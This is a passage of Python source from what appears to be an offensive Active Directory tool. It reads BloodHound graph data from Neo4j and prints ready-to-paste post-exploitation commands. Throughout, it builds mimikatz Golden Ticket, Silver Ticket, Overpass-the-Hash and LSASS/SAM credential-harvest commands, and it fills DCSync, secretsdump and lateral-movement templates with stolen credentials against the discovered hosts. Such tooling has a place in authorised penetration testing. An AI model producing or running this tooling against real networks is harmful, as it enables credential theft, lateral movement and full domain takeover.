        print(f"    {c.GREEN}mimikatz.exe \"kerberos::golden /user:{username} /domain:{domain.lower()} /sid:{sid_value} /krbtgt:<KRBTGT_HASH> /ptt\"{c.RESET}")

        # Arg acquisition for Golden Ticket - only show missing args
        missing_args = ["<KRBTGT_HASH>"]
        if not domain_sid:
            missing_args.insert(0, "<SID>")
        _print_arg_acquisition(missing_args, c)

    # =========================================================================
    # LOCAL ADMIN SECTION
    # =========================================================================
    if local_admin_targets:
        print()
        print(f"  {c.RED}{c.BOLD}LOCAL ADMIN ACCESS{c.RESET} ({len(local_admin_targets)} machines)")
        print(f"  {c.DIM}{'─'*70}{c.RESET}")

        # Priority targets with sessions
        if session_targets:
            print()
            print(f"  {c.YELLOW}★ PRIORITY TARGETS (Privileged Sessions Detected) ★{c.RESET}")
            for target in session_targets[:5]:
                sessions_str = ", ".join(target.sessions[:3])
                print(f"    {c.BOLD}{target.computer}{c.RESET}: Sessions from {c.YELLOW}{sessions_str}{c.RESET}")
                print(f"      {c.DIM}→ Run sekurlsa::logonpasswords to harvest these credentials!{c.RESET}")

        # Credential harvest order
        print()
        print(f"  {c.CYAN}CREDENTIAL HARVEST ORDER:{c.RESET}")
        print()

        harvest_commands = get_post_exploit_commands("local-admin", "credential_harvest")

        # Table header
        print(f"    {'#':<3} {'Command (copy-paste ready)':<62} {'Priority':<8}")
        print(f"    {'─'*3} {'─'*62} {'─'*8}")

        for idx, cmd_tuple in enumerate(harvest_commands, 1):
            # Tuples are (cmd_id, description, module, priority)
            cmd_id = cmd_tuple[0]
            description = cmd_tuple[1]
            module = cmd_tuple[2] if len(cmd_tuple) > 2 else cmd_id
            priority = cmd_tuple[3] if len(cmd_tuple) > 3 else "medium"

            # Build one-liner mimikatz command using the module
            mimi_cmd = f'mimikatz.exe "privilege::debug" "{module}" "exit"'

            priority_color = c.RED if priority == "high" else (c.YELLOW if priority == "medium" else c.DIM)
            print(f"    {idx:<3} {c.GREEN}{mimi_cmd:<62}{c.RESET} {priority_color}{priority.upper():<8}{c.RESET}")

        # Educational tips for harvest techniques
        _print_harvest_tips("sekurlsa::logonpasswords", c)
        _print_harvest_tips("sekurlsa::tickets", c)
        _print_harvest_tips("lsadump::sam", c)
        _print_harvest_tips("lsadump::secrets", c)

        # With harvested hash section
        print()
        print(f"  {c.CYAN}WITH HARVESTED NTLM HASH:{c.RESET}")
        print()

        # Overpass-the-Hash
        print(f"    {c.DIM}# Overpass-the-Hash (NTLM → Kerberos ticket):{c.RESET}")
        print(f"    {c.GREEN}mimikatz.exe \"sekurlsa::pth /user:{username} /domain:{domain.lower()} /ntlm:<HASH> /run:cmd.exe\"{c.RESET}")
        print()
        print(f"    {c.YELLOW}⚠ IMPORTANT: Use HOSTNAME not IP after Overpass-the-Hash!{c.RESET}")
        print(f"      {c.GREEN}✓ dir \\\\DC01\\C${c.RESET}  {c.DIM}(Kerberos - uses ticket){c.RESET}")
        print(f"      {c.RED}✗ dir \\\\10.0.0.1\\C${c.RESET}  {c.DIM}(NTLM - bypasses ticket!){c.RESET}")

        # Silver Ticket
        print()
        print(f"    {c.DIM}# Silver Ticket (requires service account hash):{c.RESET}")
        first_target = local_admin_targets[0].computer if local_admin_targets else "TARGET.DOMAIN.COM"
        sid_value = domain_sid if domain_sid else "<SID>"
        print(f"    {c.GREEN}mimikatz.exe \"kerberos::golden /domain:{domain.lower()} /sid:{sid_value} /target:{first_target.lower()} /service:cifs /rc4:<SERVICE_HASH> /user:{username} /ptt\"{c.RESET}")

        # Arg acquisition for Silver Ticket - only show missing args
        missing_args = ["<SERVICE_HASH>", "<TARGET_SPN>"]
        if not domain_sid:
            missing_args.insert(0, "<SID>")
        _print_arg_acquisition(missing_args, c)

    # =========================================================================
    # NO PRIVILEGED ACCESS
    # =========================================================================
    if not local_admin_targets and not domain_level_access:
        print()
        print(f"  {c.DIM}No local-admin or domain-admin access detected.{c.RESET}")
        print(f"  {c.DIM}Post-exploitation commands require elevated privileges.{c.RESET}")

        # Show limited options for user-level access
        user_commands = get_post_exploit_commands("user-level", "limited")
        if user_commands:
            print()
            print(f"  {c.CYAN}LIMITED OPTIONS (User-Level):{c.RESET}")
            for cmd_tuple in user_commands:
                # Tuples are (cmd_id, description, module, ...)
                description = cmd_tuple[1] if len(cmd_tuple) > 1 else ""
                module = cmd_tuple[2] if len(cmd_tuple) > 2 else cmd_tuple[0]
                print(f"    {c.GREEN}mimikatz.exe \"{module}\"{c.RESET}")
                print(f"    {c.DIM}→ {description}{c.RESET}")

    print()
    print(f"{c.CYAN}{'═'*75}{c.RESET}")


def _print_harvest_tips(technique: str, c) -> None:
    """Print educational tips for a specific harvest technique."""
    from .command_mappings import get_harvest_tips

    tips = get_harvest_tips(technique)

    if not tips.get("what_to_look_for") and not tips.get("next_steps"):
        return

    print()
    print(f"    {c.DIM}┌─ {technique} ────────────────────────────────────────────────────┐{c.RESET}")

    if tips.get("what_to_look_for"):
        print(f"    {c.DIM}│{c.RESET} {c.BOLD}WHAT TO LOOK FOR:{c.RESET}")
        for item in tips["what_to_look_for"][:4]:
            print(f"    {c.DIM}│{c.RESET}   • {item}")

    if tips.get("next_steps"):
        print(f"    {c.DIM}│{c.RESET}")
        print(f"    {c.DIM}│{c.RESET} {c.BOLD}NEXT STEPS:{c.RESET}")
        for item in tips["next_steps"][:4]:
            print(f"    {c.DIM}│{c.RESET}   • {c.GREEN}{item}{c.RESET}")

    print(f"    {c.DIM}└───────────────────────────────────────────────────────────────────┘{c.RESET}")


def _print_arg_acquisition(placeholders: List[str], c) -> None:
    """Print arg acquisition hints for critical placeholders."""
    from .command_mappings import get_arg_acquisition

    print()
    print(f"    {c.DIM}┌─ ARG ACQUISITION ─────────────────────────────────────────────────┐{c.RESET}")

    for ph in placeholders:
        arg_info = get_arg_acquisition(ph)
        if not arg_info:
            continue

        print(f"    {c.DIM}│{c.RESET} {c.BOLD}{ph}{c.RESET} - {arg_info.get('description', '')}")

        quick_cmds = arg_info.get("quick_commands", [])
        for cmd in quick_cmds[:2]:
            print(f"    {c.DIM}│{c.RESET}   → {c.GREEN}{cmd}{c.RESET}")

        if arg_info.get("requires"):
            print(f"    {c.DIM}│{c.RESET}   {c.YELLOW}Requires: {arg_info['requires']}{c.RESET}")

        if arg_info.get("example"):
            print(f"    {c.DIM}│{c.RESET}   {c.DIM}Example: {arg_info['example']}{c.RESET}")

        print(f"    {c.DIM}│{c.RESET}")

    print(f"    {c.DIM}└───────────────────────────────────────────────────────────────────┘{c.RESET}")


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def _truncate(s: str, max_len: int) -> str:
    """Truncate string with '..' indicator"""
    if len(s) > max_len:
        return s[:max_len-2] + ".."
    return s


class _NoColors:
    """Dummy colors class for non-colored output"""
    HEADER = ''
    BLUE = ''
    CYAN = ''
    GREEN = ''
    YELLOW = ''
    RED = ''
    BOLD = ''
    DIM = ''
    RESET = ''


# =============================================================================
# PWNED USER ATTACK PATHS (for run_all_queries report)
# =============================================================================

def generate_pwned_attack_paths(driver, use_colors: bool = True) -> tuple:
    """
    Generate Pwned User Attack Paths section for the report.

    Queries Neo4j for pwned users and their access paths, generates
    credential-type-aware commands based on each user's specific privileges.
    Shows ALL available techniques per target for easy copy-paste.

    Args:
        driver: Neo4j driver instance
        use_colors: Enable ANSI colors for console output

    Returns:
        Tuple of (console_output: str, markdown_output: str)
        Returns ("", "") if no pwned users
    """
    from .command_mappings import (
        CRED_TYPE_TEMPLATES,
        LATERAL_TECHNIQUES,
        fill_pwned_command,
        infer_dc_hostname,
        get_techniques_for_access,
    )

    c = Colors if use_colors else _NoColors

    # 1. Fetch all pwned users with credentials
    pwned_users = _fetch_pwned_users(driver)
    if not pwned_users:
        return "", ""

    console_lines = []
    markdown_lines = []

    # Header
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}╔══════════════════════════════════════════════════════════════════════╗{c.RESET}")
    console_lines.append(f"{c.CYAN}{c.BOLD}║{c.RESET}   {c.YELLOW}🎯{c.RESET} {c.BOLD}Pwned User Attack Paths{c.RESET}                                      {c.CYAN}{c.BOLD}║{c.RESET}")
    console_lines.append(f"{c.CYAN}{c.BOLD}╚══════════════════════════════════════════════════════════════════════╝{c.RESET}")
    console_lines.append("")

    markdown_lines.append("## 🎯 Pwned User Attack Paths")
    markdown_lines.append("")

    for user in pwned_users:
        user_name = user["name"]
        cred_type = user.get("cred_type", "password")
        cred_value = user.get("cred_value", "")

        # Extract username and domain from UPN
        if "@" in user_name:
            username, domain = user_name.split("@")
        else:
            username = user_name
            domain = ""

        # 2. Fetch access paths for this user
        access_by_priv = _fetch_user_access(driver, user_name)

        # 3. Check domain-level access
        domain_access = _check_domain_access(driver, user_name)

        # User header
        console_lines.append(f"{c.BOLD}{c.CYAN}{'═'*70}{c.RESET}")
        console_lines.append(f"{c.BOLD}{user_name}{c.RESET}")
        console_lines.append(f"{c.DIM}Credential:{c.RESET} {c.YELLOW}{cred_type}{c.RESET}")
        console_lines.append(f"{c.CYAN}{'─'*70}{c.RESET}")

        markdown_lines.append(f"### {user_name}")
        markdown_lines.append(f"**Credential:** {cred_type}")
        markdown_lines.append("")

        # Domain-level access (DCSync / DomainAdmin)
        if domain_access in ("DCSync", "DomainAdmin", "GenericAll"):
            console_lines.append("")
            access_label = "DOMAIN ADMIN" if domain_access == "DomainAdmin" else domain_access
            console_lines.append(f"👑 {c.RED}{c.BOLD}DOMAIN ADMIN ACCESS{c.RESET} [{access_label}]")
            console_lines.append("")
            console_lines.append(f"  {'Attack':<22} {'Reason':<40} {'Ready Command'}")
            console_lines.append(f"  {'-'*22} {'-'*40} {'-'*60}")

            template = CRED_TYPE_TEMPLATES.get(cred_type, {}).get("DCSync")
            if template and cred_value:
                cmd = fill_pwned_command(template, username, domain, infer_dc_hostname(domain), cred_value)
                reason = "Member of Domain Admins" if domain_access == "DomainAdmin" else "GetChanges+GetChangesAll"
                console_lines.append(
                    f"  {c.BOLD}{'DCSync':<22}{c.RESET} "
                    f"{c.YELLOW}{_truncate(reason, 38):<40}{c.RESET} "
                    f"{c.GREEN}{cmd}{c.RESET}"
                )

            markdown_lines.append(f"#### DCSync - Dump Domain Credentials ⚡")
            markdown_lines.append(f"| Attack | Reason | Command |")
            markdown_lines.append(f"|--------|--------|---------|")
            if template and cred_value:
                cmd = fill_pwned_command(template, username, domain, infer_dc_hostname(domain), cred_value)
                reason = "Member of Domain Admins" if domain_access == "DomainAdmin" else "GetChanges+GetChangesAll"
                markdown_lines.append(f"| DCSync | {reason} | `{cmd}` |")
            markdown_lines.append("")

        # Local Admin access - per-target technique list
        admin_machines = access_by_priv.get("local-admin", [])
        if admin_machines:
            console_lines.append("")
            console_lines.append(f"🩸 {c.RED}{c.BOLD}LOCAL ADMIN ACCESS{c.RESET} ({len(admin_machines)} machines)")
            console_lines.append("")

            markdown_lines.append(f"#### Local Admin Access ({len(admin_machines)} machines)")
            markdown_lines.append("")

            priority_targets = []
            techniques = get_techniques_for_access("AdminTo")

            for ma in admin_machines[:10]:
                has_sessions = bool(ma.get("privileged_sessions"))
                inherited_from = ma.get("inherited_from")
                access_note = f" (via {inherited_from})" if inherited_from else ""

                console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}{c.DIM}{access_note}{c.RESET}")

                markdown_lines.append(f"**{ma['computer']}**{access_note}")
                markdown_lines.append("")
                markdown_lines.append("| Technique | Command |")
                markdown_lines.append("|-----------|---------|")

                # Show all available techniques for this target
                for tech in techniques:
                    template = tech.command_templates.get(cred_type)
                    if template and cred_value:
                        cmd = fill_pwned_command(template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                        tech_short = tech.name.split()[0].lower()
                        console_lines.append(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")
                        markdown_lines.append(f"| {tech_short} | `{cmd}` |")

                console_lines.append("")  # Space between targets
                markdown_lines.append("")

                # Track priority targets for separate display
                if has_sessions:
                    priority_targets.append((ma, ma.get("privileged_sessions", [])))

            if len(admin_machines) > 10:
                console_lines.append(f"  {c.DIM}... and {len(admin_machines) - 10} more machines{c.RESET}")

            # Priority targets with sessions (secretsdump)
            if priority_targets:
                console_lines.append("")
                console_lines.append(f"  {c.YELLOW}⚠ PRIORITY TARGETS (privileged sessions detected){c.RESET}")
                console_lines.append("")

                markdown_lines.append(f"**Priority Targets (Active Sessions)**")
                markdown_lines.append("")

                for ma, sessions in priority_targets[:5]:
                    sessions_str = ", ".join(sessions[:2])
                    console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}")
                    console_lines.append(f"    {c.YELLOW}Sessions: {sessions_str}{c.RESET}")

                    markdown_lines.append(f"**{ma['computer']}** - Sessions: {sessions_str}")
                    markdown_lines.append("")

                    sd_template = CRED_TYPE_TEMPLATES.get(cred_type, {}).get("secretsdump")
                    if sd_template and cred_value:
                        sd_cmd = fill_pwned_command(sd_template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                        console_lines.append(f"    {c.DIM}secretsdump:{c.RESET}  {c.GREEN}{sd_cmd}{c.RESET}")
                        markdown_lines.append(f"```bash\n{sd_cmd}\n```")
                    console_lines.append("")
                    markdown_lines.append("")

            # Technique comparison legend
            console_lines.append(_generate_technique_legend_console(techniques, c))
            markdown_lines.append(_generate_technique_legend_markdown(techniques))

        # User-level access (RDP, WinRM) - per-target technique list
        user_machines = access_by_priv.get("user-level", [])
        if user_machines:
            console_lines.append("")
            console_lines.append(f"🔵 {c.BLUE}{c.BOLD}USER-LEVEL ACCESS{c.RESET} ({len(user_machines)} machines)")
            console_lines.append("")

            markdown_lines.append(f"#### User-Level Access ({len(user_machines)} machines)")
            markdown_lines.append("")

            for ma in user_machines[:5]:
                access_types = ma.get("access_types", [])
                console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}")

                markdown_lines.append(f"**{ma['computer']}**")
                markdown_lines.append("")
                markdown_lines.append("| Technique | Command |")
                markdown_lines.append("|-----------|---------|")

                for access_type in access_types:
                    if access_type in ("CanRDP", "CanPSRemote"):
                        techniques = get_techniques_for_access(access_type)
                        for tech in techniques:
                            template = tech.command_templates.get(cred_type)
                            if template and cred_value:
                                cmd = fill_pwned_command(template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                                tech_short = tech.name.split()[0].lower()
                                console_lines.append(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")
                                markdown_lines.append(f"| {tech_short} | `{cmd}` |")

                console_lines.append("")
                markdown_lines.append("")

        # DCOM access - per-target technique list
        dcom_machines = access_by_priv.get("dcom-exec", [])
        if dcom_machines:
            console_lines.append("")
            console_lines.append(f"⚙️  {c.BLUE}{c.BOLD}DCOM ACCESS{c.RESET} ({len(dcom_machines)} machines)")
            console_lines.append("")

            markdown_lines.append(f"#### DCOM Access ({len(dcom_machines)} machines)")
            markdown_lines.append("")

            techniques = get_techniques_for_access("ExecuteDCOM")

            for ma in dcom_machines[:3]:
                console_lines.append(f"  {c.BOLD}{ma['computer']}{c.RESET}")

                markdown_lines.append(f"**{ma['computer']}**")
                markdown_lines.append("")
                markdown_lines.append("| Technique | Command |")
                markdown_lines.append("|-----------|---------|")

                for tech in techniques:
                    template = tech.command_templates.get(cred_type)
                    if template and cred_value:
                        cmd = fill_pwned_command(template, username, domain, ma['computer'], cred_value, target_ip=ma.get('computer_ip', ''))
                        tech_short = tech.name.split()[0].lower()
                        console_lines.append(f"    {c.DIM}{tech_short:>10}:{c.RESET}  {c.GREEN}{cmd}{c.RESET}")
                        markdown_lines.append(f"| {tech_short} | `{cmd}` |")

                console_lines.append("")
                markdown_lines.append("")

        # No edge-based access found
        if not admin_machines and not user_machines and not dcom_machines and not domain_access:
            console_lines.append(f"{c.DIM}No direct machine access via AdminTo/CanRDP/CanPSRemote edges.{c.RESET}")
            markdown_lines.append("_No direct machine access via BloodHound edges_")
            markdown_lines.append("")

        console_lines.append("")

    # Show authenticated user attacks ONCE at the end (template form)
    # These are generic - same for any domain user
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}AUTHENTICATED USER ATTACKS{c.RESET} (Any domain user can run these)")
    console_lines.append(f"{c.DIM}Replace placeholders with your credentials:{c.RESET}")
    console_lines.append("")

    from .command_mappings import AUTHENTICATED_USER_TEMPLATES, AUTHENTICATED_ATTACKS
    templates = AUTHENTICATED_USER_TEMPLATES.get("password", {})

    console_lines.append(f"  {'Attack':<25} {'Command Template'}")
    console_lines.append(f"  {'-'*25} {'-'*80}")

    for attack in AUTHENTICATED_ATTACKS:
        template = templates.get(attack["id"])
        if template:
            priority = " ⚡" if attack.get("priority") == "high" else ""
            name_display = f"{attack['name']}{priority}"
            console_lines.append(f"  {c.BOLD}{name_display:<25}{c.RESET} {c.GREEN}{template}{c.RESET}")

    console_lines.append("")

    # Markdown version
    markdown_lines.append(generate_authenticated_attacks_template_markdown())

    return "\n".join(console_lines), "\n".join(markdown_lines)


def _fetch_pwned_users(driver) -> list:
    """Fetch all pwned users with their credentials from Neo4j."""
    try:
        with driver.session() as session:
            result = session.run("""
                MATCH (u:User)
                WHERE u.pwned = true
                RETURN u.name AS name,
                       u.pwned_cred_types AS cred_types,
                       u.pwned_cred_values AS cred_values,
                       u.pwned_source_machine AS source_machine
                ORDER BY u.pwned_at DESC
            """)
            # Convert array format to single value for display (use first credential)
            users = []
            for record in result:
                cred_types = record["cred_types"] or []
                cred_values = record["cred_values"] or []
                users.append({
                    "name": record["name"],
                    "cred_type": cred_types[0] if cred_types else "password",
                    "cred_value": cred_values[0] if cred_values else "",
                    "source_machine": record["source_machine"]
                })
            return users
    except Exception:
        return []


def _fetch_user_access(driver, user_name: str) -> dict:
    """
    Fetch user's access paths grouped by privilege level.

    Includes both direct access AND inherited access through group membership
    (e.g., DOMAIN ADMINS members have AdminTo on all computers).

    Returns:
        Dict with keys: 'local-admin', 'user-level', 'dcom-exec'
        Each value is a list of dicts with 'computer', 'access_types', 'privileged_sessions', 'inherited_from'
    """
    try:
        with driver.session() as session:
            # Query for BOTH direct access AND inherited access through groups
            result = session.run("""
                // Direct access
                MATCH (u:User {name: $user_name})-[r:AdminTo|CanRDP|CanPSRemote|ExecuteDCOM]->(c:Computer)
                OPTIONAL MATCH (c)<-[:HasSession]-(priv:User)
                WHERE priv.admincount = true AND priv.name <> u.name
                WITH c, type(r) AS access_type, null AS inherited_from, collect(DISTINCT priv.name) AS priv_sessions
                RETURN c.name AS computer,
                       c.bloodtrail_ip AS computer_ip,
                       collect(DISTINCT access_type) AS access_types,
                       inherited_from,
                       priv_sessions AS privileged_sessions

                UNION

                // Inherited access through group membership
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)-[r:AdminTo|CanRDP|CanPSRemote|ExecuteDCOM]->(c:Computer)
                OPTIONAL MATCH (c)<-[:HasSession]-(priv:User)
                WHERE priv.admincount = true AND priv.name <> u.name
                WITH c, type(r) AS access_type, g.name AS inherited_from, collect(DISTINCT priv.name) AS priv_sessions
                RETURN c.name AS computer,
                       c.bloodtrail_ip AS computer_ip,
                       collect(DISTINCT access_type) AS access_types,
                       inherited_from,
                       priv_sessions AS privileged_sessions
            """, {"user_name": user_name})

            # Group by privilege level, deduplicating by computer
            access_by_priv = {
                "local-admin": [],
                "user-level": [],
                "dcom-exec": [],
            }
            seen_computers = {}  # Track to avoid duplicates

            for record in result:
                computer = record["computer"]
                computer_ip = record.get("computer_ip") or ""  # NEW: Get IP
                access_types = record["access_types"]
                inherited_from = record["inherited_from"]

                # Skip if we've seen this computer with same or better access
                if computer in seen_computers:
                    # Merge access types if same computer
                    existing = seen_computers[computer]
                    existing["access_types"] = list(set(existing["access_types"]) | set(access_types))
                    if inherited_from and not existing.get("inherited_from"):
                        existing["inherited_from"] = inherited_from
                    # Update IP if not already set
                    if computer_ip and not existing.get("computer_ip"):
                        existing["computer_ip"] = computer_ip
                    continue

                entry = {
                    "computer": computer,
                    "computer_ip": computer_ip,  # NEW: Store IP
                    "access_types": access_types,
                    "privileged_sessions": [s for s in record["privileged_sessions"] if s],
                    "inherited_from": inherited_from,
                }
                seen_computers[computer] = entry

                # Categorize by highest privilege
                if "AdminTo" in access_types:
                    access_by_priv["local-admin"].append(entry)
                elif "ExecuteDCOM" in access_types:
                    access_by_priv["dcom-exec"].append(entry)
                elif access_types:  # CanRDP, CanPSRemote
                    access_by_priv["user-level"].append(entry)

            return access_by_priv

    except Exception:
        return {"local-admin": [], "user-level": [], "dcom-exec": []}


def _check_domain_access(driver, user_name: str) -> str:
    """
    Check if user has domain-level privileges (direct or inherited through groups).

    Checks:
    1. Direct DCSync rights (GetChanges + GetChangesAll)
    2. Inherited DCSync through group membership (e.g., DOMAIN ADMINS)
    3. GenericAll on Domain
    4. Membership in high-privilege groups (Domain Admins, Enterprise Admins, Backup Operators)

    Returns:
        'DCSync' if user has GetChanges+GetChangesAll (direct or inherited)
        'DomainAdmin' if user is member of Domain Admins
        'GenericAll' if user has GenericAll on domain
        None otherwise
    """
    try:
        with driver.session() as session:
            # Check direct DCSync
            result = session.run("""
                MATCH (u:User {name: $user_name})-[r:GetChanges|GetChangesAll]->(d:Domain)
                WITH u, d, collect(DISTINCT type(r)) AS rights
                WHERE 'GetChanges' IN rights AND 'GetChangesAll' IN rights
                RETURN 'DCSync' AS access
            """, {"user_name": user_name})

            if result.single():
                return "DCSync"

            # Check inherited DCSync through group membership
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)-[r:GetChanges|GetChangesAll]->(d:Domain)
                WITH g, d, collect(DISTINCT type(r)) AS rights
                WHERE 'GetChanges' IN rights AND 'GetChangesAll' IN rights
                RETURN 'DCSync' AS access, g.name AS via_group
            """, {"user_name": user_name})

            record = result.single()
            if record:
                return "DCSync"

            # Check membership in Domain Admins / Enterprise Admins (implicit DCSync)
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)
                WHERE g.name STARTS WITH 'DOMAIN ADMINS@'
                   OR g.name STARTS WITH 'ENTERPRISE ADMINS@'
                   OR g.objectid ENDS WITH '-512'
                   OR g.objectid ENDS WITH '-519'
                RETURN g.name AS admin_group
                LIMIT 1
            """, {"user_name": user_name})

            record = result.single()
            if record:
                return "DomainAdmin"

            # Check direct GenericAll on Domain
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:GenericAll]->(d:Domain)
                RETURN 'GenericAll' AS access
            """, {"user_name": user_name})

            if result.single():
                return "GenericAll"

            # Check inherited GenericAll through group
            result = session.run("""
                MATCH (u:User {name: $user_name})-[:MemberOf*1..]->(g:Group)-[:GenericAll]->(d:Domain)
                RETURN 'GenericAll' AS access
            """, {"user_name": user_name})

            if result.single():
                return "GenericAll"

            return None

    except Exception:
        return None


# =============================================================================
# AUTHENTICATED USER ATTACKS (any domain user can run)
# =============================================================================

def _generate_authenticated_attacks(
    username: str,
    domain: str,
    cred_type: str,
    cred_value: str,
    dc_ip: str = None,
    use_colors: bool = True
) -> tuple:
    """
    Generate authenticated user attack commands.

    These attacks work for ANY authenticated domain user,
    regardless of BloodHound edges.

    Args:
        username: Username (without domain)
        domain: Domain name
        cred_type: password, ntlm-hash, kerberos-ticket
        cred_value: The credential value
        dc_ip: DC IP/hostname (optional, inferred from domain if not provided)
        use_colors: Enable ANSI colors

    Returns:
        Tuple of (console_lines: List[str], markdown_lines: List[str])
    """
    from .command_mappings import (
        AUTHENTICATED_USER_TEMPLATES,
        AUTHENTICATED_ATTACKS,
        fill_pwned_command,
        infer_dc_hostname,
    )

    c = Colors if use_colors else _NoColors

    # Get templates for this cred type
    templates = AUTHENTICATED_USER_TEMPLATES.get(cred_type, {})
    if not templates:
        return [], []

    dc = dc_ip or infer_dc_hostname(domain)

    console_lines = []
    markdown_lines = []

    # Section header
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}AUTHENTICATED USER ATTACKS{c.RESET} (Any domain user can run these)")
    console_lines.append("")

    # Table header (DRY format matching other command tables)
    console_lines.append(f"  {'Attack':<25} {'Objective':<45} {'Ready Command'}")
    console_lines.append(f"  {'-'*25} {'-'*45} {'-'*60}")

    markdown_lines.append("#### Authenticated User Attacks")
    markdown_lines.append("| Attack | Objective | Command |")
    markdown_lines.append("|--------|-----------|---------|")

    for attack in AUTHENTICATED_ATTACKS:
        template = templates.get(attack["id"])
        if not template:
            continue

        # Fill the command template
        cmd = fill_pwned_command(template, username, domain, dc, cred_value, dc)

        # Priority indicator
        priority = attack.get("priority", "medium")
        priority_indicator = " ⚡" if priority == "high" else ""

        # Truncate for table display
        name_display = _truncate(attack['name'] + priority_indicator, 23)
        objective_display = _truncate(attack['objective'], 43)

        # Console: tabular row
        console_lines.append(
            f"  {c.BOLD}{name_display:<25}{c.RESET} "
            f"{c.YELLOW}{objective_display:<45}{c.RESET} "
            f"{c.GREEN}{cmd}{c.RESET}"
        )

        # Markdown
        markdown_lines.append(f"| {attack['name']}{priority_indicator} | {attack['objective']} | `{cmd}` |")

    console_lines.append("")
    markdown_lines.append("")

    return console_lines, markdown_lines


def print_authenticated_attacks_template(use_colors: bool = True, dc_ip: str = None) -> None:
    """
    Print authenticated user attacks in template form (once, at end of output).

    Shows placeholders instead of filled credentials since these attacks
    are generic and work for ANY authenticated domain user.

    Args:
        use_colors: Enable ANSI colors
        dc_ip: Domain Controller IP (replaces <DC_IP> placeholder if provided)
    """
    from .command_mappings import AUTHENTICATED_USER_TEMPLATES, AUTHENTICATED_ATTACKS

    c = Colors if use_colors else _NoColors

    print(f"\n{c.CYAN}{c.BOLD}AUTHENTICATED USER ATTACKS{c.RESET} (Any domain user can run these)")
    print(f"{c.DIM}Replace placeholders with your credentials:{c.RESET}")
    print()

    # Show password templates (most common)
    templates = AUTHENTICATED_USER_TEMPLATES.get("password", {})

    print(f"  {'Attack':<25} {'Command Template'}")
    print(f"  {'-'*25} {'-'*80}")

    for attack in AUTHENTICATED_ATTACKS:
        template = templates.get(attack["id"])
        if template:
            # Replace DC_IP if stored
            if dc_ip:
                template = template.replace("<DC_IP>", dc_ip)
            priority = " ⚡" if attack.get("priority") == "high" else ""
            name_display = f"{attack['name']}{priority}"
            print(f"  {c.BOLD}{name_display:<25}{c.RESET} {c.GREEN}{template}{c.RESET}")

    print()


def generate_authenticated_attacks_template_markdown() -> str:
    """Generate markdown version of authenticated attacks template."""
    from .command_mappings import AUTHENTICATED_USER_TEMPLATES, AUTHENTICATED_ATTACKS

    lines = []
    lines.append("#### Authenticated User Attacks (Any Domain User)")
    lines.append("")
    lines.append("Replace placeholders with your credentials:")
    lines.append("")
    lines.append("| Attack | Command Template |")
    lines.append("|--------|------------------|")

    templates = AUTHENTICATED_USER_TEMPLATES.get("password", {})

    for attack in AUTHENTICATED_ATTACKS:
        template = templates.get(attack["id"])
        if template:
            priority = " ⚡" if attack.get("priority") == "high" else ""
            lines.append(f"| {attack['name']}{priority} | `{template}` |")

    lines.append("")
    return "\n".join(lines)
